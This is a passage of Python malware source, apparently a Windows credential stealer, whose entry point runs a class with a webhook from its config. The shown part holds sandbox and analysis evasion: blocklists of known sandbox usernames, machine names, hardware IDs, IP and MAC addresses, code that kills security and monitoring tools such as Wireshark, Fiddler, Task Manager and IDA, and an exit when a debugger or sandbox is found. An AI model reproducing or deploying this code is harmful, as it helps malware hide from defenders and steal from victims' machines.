                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


class Debug:
    def __init__(self):
        if self.checks():
            self.self_destruct()

    def checks(self):
        debugging = False

        self.blackListedUsers = [
            'lmVwjj9b', 'PqOxsS', '3v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'Sqf3G', 'Lucas', 'mike', 'PateX', 'h7Pr', 'Louise',
            'User01', 'test', 'UyrznReg']
        self.blackListedPCNames = [
            'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
            'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P',
            'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = [
            '7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555',
            '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A',
            '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121',
            '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7',
            '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE',
            'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3',
            'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF',
            '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0',
            '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4',
            'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08',
            'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661',
            '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = [
            '88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116',
            '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151',
            '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50',
            '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143',
            '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97',
            '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167',
            '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
        self.blackListedMacs = [
            '00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de',
            '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40',
            '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33',
            '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06',
            '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d',
            '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']
        self.blacklistedProcesses = [
            "httpdebuggerui", "wireshark", "fiddler", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "joeboxserver"]

        self.check_process()
        if self.get_network():
            debugging = True
        if self.get_system():
            debugging = True
        return debugging

    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any(procstr in proc.name().lower() for procstr in self.blacklistedProcesses):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
        if sys.gettrace():
            sys.exit(0)

    def get_network(self) -> bool:
        ip = requests.get('https://api.ipify.org').text
        interface, addrs = next(iter(psutil.net_if_addrs().items()))
        mac = addrs[0].address

        if ip in self.blackListedIPS:
            return True
        if mac in self.blackListedMacs:
            return True

    def get_system(self) -> bool:
        username = os.getenv("UserName")
        hostname = os.getenv("COMPUTERNAME")
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()

        if hwid in self.blackListedHWIDS:
            return True
        if username in self.blackListedUsers:
            return True
        if hostname in self.blackListedPCNames:
            return True

    def self_destruct(self) -> None:
        sys.exit(0)


if __name__ == '__main__' and os.name == "nt":
    Purora(__CONFIG__["webhook"])
